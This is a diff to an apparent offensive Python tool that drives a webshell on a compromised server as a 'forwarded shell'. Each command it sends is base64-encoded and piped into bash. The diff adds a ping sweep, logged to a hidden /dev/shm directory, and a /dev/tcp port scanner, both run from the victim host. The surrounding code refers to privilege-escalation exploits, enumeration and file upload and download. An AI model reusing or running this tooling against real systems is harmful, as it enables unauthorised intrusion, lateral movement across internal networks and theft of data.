@@ -76,10 +76,8 @@ def checkConn(url):
     if r.status_code == 200:
         print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
     else:
-        print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
+        print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection refused\n" + c.END)
         sys.exit(0)
-
-    return r.text
 
 # Function to create the fifos on the victim (to have an interactive tty)
 def createFifos(url, parameter):
@@ -286,12 +284,12 @@ def downloadFile(url, parameter, file_to_download):
     downloadData = {
         f"{parameter}": f"echo {base64command} | base64 -d | bash"
     }
-    r = requests.post(url, data=downloadData, timeout=8)
+
+    r = requests.post(url, data=downloadData, timeout=12)
 
     time.sleep(1)
     fileContent = cleanHTML(r.text)
-    fileContent = b64decode(r.text).decode()
-    fileContent = fileContent.replace('\\n', '\n')
+    fileContent = b64decode(fileContent).decode()
 
     stored_file = file_to_download.split('/')[-1]
     f = open(f"{stored_file}", "w")
@@ -299,6 +297,57 @@ def downloadFile(url, parameter, file_to_download):
     f.close()
 
     print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + f"] File downloaded successfully as {stored_file}\n" + c.END)
+
+# Perform a basic ping sweep to detect active IPs
+def hostScan(url, parameter, ip):
+    
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Starting host discovery, system must have ping installed\n" + c.END)
+    raw_command = """for number in $(seq 1 254); do timeout 1 bash -c "ping -c 1 %s.${number}" &>/dev/null && echo -e "%s.${number}" >> /dev/shm/.fs/logs.tmp & done""" % (ip, ip)
+    base64command = b64encode(raw_command.encode()).decode()
+    
+    hostData = {
+        f"{parameter}": f"echo {base64command} | base64 -d | bash"
+    }
+    
+    r = requests.post(url, data=hostData, timeout=12)
+
+    raw_command = """cat /dev/shm/.fs/logs.tmp"""
+    base64command = b64encode(raw_command.encode()).decode()
+    
+    hostData = {
+        f"{parameter}": f"echo {base64command} | base64 -d | bash"
+    }
+
+    r = requests.post(url, data=hostData, timeout=8)
+    
+    data = cleanHTML(r.text)
+    if data:
+        print(c.YELLOW + "Hosts" + c.END)
+        print(c.YELLOW + "-----" + c.END)
+        print(data)
+    else:
+        print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] No hosts discovered\n" + c.END)
+
+# Function to discover open ports on especified ip
+def portScan(url, parameter, ip):
+
+    print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Starting port discovery, no requirements are needed\n" + c.END)
+    raw_command = """for port in $(seq 1 5000); do timeout 1 bash -c "(echo '' > /dev/tcp/%s/${port})" 2>/dev/null && echo -e "${port}" & done""" % (ip)
+    base64command = b64encode(raw_command.encode()).decode()
+
+    portData = {
+        f"{parameter}": f"echo {base64command} | base64 -d | bash"
+    }
+    
+    r = requests.post(url, data=portData, timeout=20)
+
+    data = cleanHTML(r.text)
+    if data:
+        print(c.YELLOW + "Ports" + c.END)
+        print(c.YELLOW + "-----" + c.END)
+        print(data)
+    else:
+        print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] No ports discovered\n" + c.END)
 
 # Clean RCE output
 def cleanHTML(out):
@@ -319,8 +368,8 @@ if __name__ == '__main__':
     print(c.YELLOW + mybanner + c.END)
 
     # Check connections to the webshell
-    response = checkConn(url)
-    
+    checkConn(url)
+
     # Create an interactive shell
     createFifos(url, parameter)
     print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system info" + c.END)
@@ -331,7 +380,7 @@ if __name__ == '__main__':
 
     print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type dfs-help to see a list of custom commands of this forwarded shell\n" + c.END)
 
-    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs"]
+    customCommands = ["dfs-help", "help-dfs", "dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-exploit", "exploit-dfs", "dfs-exploits", "dfs-binaries", "binaries-dfs", "dfs-download", "download-dfs", "dfs-upload", "upload-dfs", "dfs-hostscan", "hostscan-dfs","dfs-portscan","portscan-dfs"]
     
     # Loop to execute commands
     while True:
@@ -345,6 +394,8 @@ if __name__ == '__main__':
             print(c.YELLOW + "--------\t\t-----------" + c.END)
             print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
             print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
+            print(c.BLUE + "dfs-hostscan\t\tscan active hosts in a valid range (Example: 192.168.1)" + c.END)
+            print(c.BLUE + "dfs-portscan\t\tscan 5000 ports over a ip (Example: 192.168.1.1)" + c.END)
             print(c.BLUE + "dfs-upload\t\tupload a file to the server" + c.END)
             print(c.BLUE + "dfs-download\t\tdownload the specified file from the server" + c.END)
             print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pwnkit, dirty pipe)" + c.END)
@@ -394,6 +445,28 @@ if __name__ == '__main__':
             for port in hex_ports.strip('\n').split('\n'):
                 print(c.BLUE + str(int(port, 16)) + c.END)
             print('')
+        
+        if command_to_exec == "dfs-hostscan" or command_to_exec == "hostscan-dfs":
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Provide a valid ip range" + c.END)
+            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-hostscan 192.168.1\n" + c.END)
+            
+        if command_to_exec == "dfs-portscan" or command_to_exec == "portscan-dfs":
+            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Provide a valid ip" + c.END)
+            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-portscan 192.168.1.2\n" + c.END)
+
+        try:
+            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-hostscan":
+                ip = command_to_exec.split(' ')[1]
+                hostScan(url, parameter, ip)
+        except:
+            pass
+
+        try:
+            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-portscan":
+                ip = command_to_exec.split(' ')[1]
+                portScan(url, parameter, ip)
+        except:
+            pass
 
         if command_to_exec == "dfs-binaries" or command_to_exec == "binaries-dfs":
             binList = checkBinaries(url, parameter)
@@ -432,7 +505,7 @@ if __name__ == '__main__':
             print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!\n" + c.END)
             sys.exit(0)
 
-        if command_to_exec not in customCommands and not command_to_exec.startswith("dfs-upload ") and not command_to_exec.startswith("dfs-download "):
+        if command_to_exec not in customCommands and not command_to_exec.startswith("dfs-upload ") and not command_to_exec.startswith("dfs-download ") and not command_to_exec.startswith("dfs-hostscan ") and not command_to_exec.startswith('dfs-portscan '):
             execCommand(url, parameter, command_to_exec + "\n")
             # Read command output
             resp = readCommand(url, parameter)
